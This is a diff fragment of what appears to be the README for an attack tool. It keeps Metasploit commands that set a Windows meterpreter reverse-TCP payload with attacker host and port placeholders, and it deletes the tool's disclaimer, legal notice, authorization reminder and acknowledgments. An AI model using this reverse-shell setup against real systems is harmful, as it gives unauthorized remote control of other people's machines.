@@ -36,21 +36,3 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST <your_ip>
 set LPORT <port_you_listen>
 run
-
-Disclaimer
-
-This tool is provided for educational and research purposes only. It is essential to ensure you have proper authorization to conduct any security testing on a system. Unauthorized access to or use of computer systems may violate local and international laws. The authors disclaim any responsibility for illegal or unethical use of this tool.
-
-Always seek written permission from the system owner or administrator before conducting any security testing on their systems.
-
-Legal Notice
-
-The usage of this tool may be subject to local and international laws and regulations. It is the user's responsibility to comply with these laws. The authors of this tool shall not be held responsible for any legal issues arising from the misuse of this tool.
-
-Acknowledgments
-
-The authors would like to acknowledge the Metasploit Project and Avira Antivirus for their respective software components used in this tool.
-
-Contact Information
-
-For any inquiries or feedback, please contact the authors at your_email@example.com.
